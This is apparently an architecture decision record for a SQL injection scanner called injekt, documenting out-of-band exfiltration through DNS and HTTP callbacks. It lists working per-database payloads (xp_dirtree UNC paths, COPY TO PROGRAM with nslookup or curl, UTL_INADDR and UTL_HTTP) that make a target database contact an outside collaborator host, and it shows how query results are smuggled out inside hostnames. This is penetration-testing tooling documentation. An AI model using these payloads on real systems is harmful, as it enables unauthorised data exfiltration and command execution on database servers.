# ADR 0006: Out-of-Band (OOB) Exfiltration

## Status
Implemented

## Context
Boolean/time/error/union techniques all read the HTTP response. Some stacks
are fully blind: the query runs but the response never reflects it (e.g.
`ORDER BY` in an `UPDATE`, second-order injections, WAFs stripping error
text). `sqlmap --dns-domain` and PortSwigger OOB labs show the answer is a
side channel: force the DB server to resolve/fetch a unique
`<token>.<domain>` so a collaborator (Burp Collaborator, interactsh,
self-hosted DNS/HTTP listener) observes the callback.

We need OOB that:
1. Is strictly OPT-IN (requires operator-owned collaborator infra)
2. Never emits a finding without callback evidence (no FP from silence)
3. Covers MySQL / Postgres / MSSQL / Oracle with the most reliable vector first
4. Reuses tamper variants, rate limiting and jitter like every other technique

## Decision
Introduce `src/techniques/oob/` with payloads, detector and verifier.

### Payloads (`payloads.rs`)
- `new_token()` → `oob` + 12 hex chars (DNS-label safe, starts with a letter).
- `build_subdomain(token, domain)` → `<token>.<domain>` (sanitized, lowercased).
- `is_valid_oob_domain()` — rejects URLs, ports, whitespace, `_`, labels
  violating RFC 1035; requires at least one dot.
- Per-DBMS interaction probes (`oob_payloads_for`), most reliable first:
  - MySQL: `LOAD_FILE(CONCAT('\\\\','<fqdn>','\\a'))` (Windows UNC only — documented).
  - Postgres: `COPY (SELECT '') TO PROGRAM 'nslookup <fqdn>'`, `curl` variant, `dblink_connect`.
  - MSSQL: `xp_dirtree '\\<fqdn>\a'`, `xp_fileexist`, `sp_OACreate MSXML2.ServerXMLHTTP`.
  - Oracle: `UTL_INADDR.GET_HOST_ADDRESS`, `UTL_HTTP.REQUEST`, `DBMS_LDAP.INIT`, XXE `EXTRACTVALUE`.
  - Generic (`None`): MSSQL + Oracle + MySQL first probes, relabelled `generic`.
- Data exfil (`oob_exfil_payloads_for(dbms, domain, token, select_expr)`) —
  scalar subquery concatenated into the looked-up hostname
  (`xp_dirtree '\\'+@p+'.<suffix>'`, `UTL_INADDR(...||'.<suffix>')`, ...).
- `encode_for_dns` / `chunk_for_dns` helpers for hex exfil under the 63-char label limit.

### Detector (`detector.rs`)
- `evaluate_with_callback(..., callback_seen)`:
  - `true` → vulnerable, confidence **0.95** (response body ignored — async OOB
    typically returns the baseline page).
  - `false` + OOB error markers (`UTL_INADDR`, `xp_dirtree`, `ORA-24247`, ...)
    with error context → rejected, 0.2.
  - `false` + baseline-similar → silently accepted candidate, 0.35 (**not** a finding).
  - `false` + unexplained diff → likely filter/WAF, 0.15.
- `token_seen_in_interactions()` — case-insensitive substring over DNS/HTTP logs.

### Verifier (`verifier.rs`)
- `OobVerifier` trait (async `verify(token) -> bool`).
- `HttpPollVerifier` — generic collaborator shim: `{token}` / `%TOKEN%`
  placeholders, else `?token=` / `/token` appended; accepts token-in-body,
  `{"seen":true}` or non-empty `interactions` (interactsh-style).
- `InMemoryVerifier` (tests), `NoopVerifier` (manual mode).

### Engine integration
- `EngineConfig.oob_domain / oob_poll_url / oob_wait_secs` (default 5s, clamped 0-30).
- `test_oob_bounded`: skipped silently without domain; invalid domains warn.
  One token per parameter, ≤3 payloads × tamper variants, wait, then ≤3 polls
  2s apart. Finding (`TechniqueKind::Oob`, 0.95) only on callback.
- Evidence: `oob channel=dns dbms=mssql token=... fqdn=... probes=3`.
- Manual mode (no `--oob-poll-url`): probes sent (one variant each), `info!`
  with token/fqdn for collaborator UI check, never auto-confirmed.

### CLI
```bash
injekt --target "https://ex/?id=1" --techniques oob --oob-domain x.oastify.com
injekt --target "https://ex/?id=1" --techniques oob --oob-domain c.example.com \
  --oob-poll-url "https://c.example.com/poll/{token}" --oob-wait-secs 5
```

### OPSEC
OOB egress originates from the **target DB server** to third-party infra —
injekt cannot proxy it. Prefer self-hosted collaborator; never point it at a
domain you do not control. Documented in `docs/OPSEC.md`.

## Testing
- Unit: payload embedding per DBMS, token DNS-safety/uniqueness, domain
  validation, exfil expression embedding, detector callback/error/silent/diff
  cases, verifier poll-URL expansion and body heuristics.
- Integration (`tests/integration_oob.rs`, 5 tests): confirmed on
  `{"seen":true}`, no finding on `{"seen":false}`, skipped without/invalid
  domain, manual mode sends probes without finding (request count ≥ 6).

## Consequences
Positive: covers fully-blind stacks; zero FP without evidence; generic poll
shim works with any collaborator exposing HTTP polling.

Negative: requires operator infra; slower (waits + polls); MySQL UNC is
Windows-only; `COPY TO PROGRAM` needs superuser.

## Alternatives Considered
1. **Time-based inference only** — no infra, but 10-100x slower per byte.
2. **Burp-only API** — tighter integration, but locks out interactsh/self-hosted.
3. **Auto-confirm on silent accept** — rejected: silence is not evidence.

## References
- PortSwigger Web Security Academy, blind SQLi OOB labs
- PayloadsAllTheThings (Postgres `COPY TO PROGRAM`, Oracle `UTL_*`, MSSQL UNC)
- NetSPI PowerUpSQL UNC cheat sheet; `sqlmap --dns-domain`
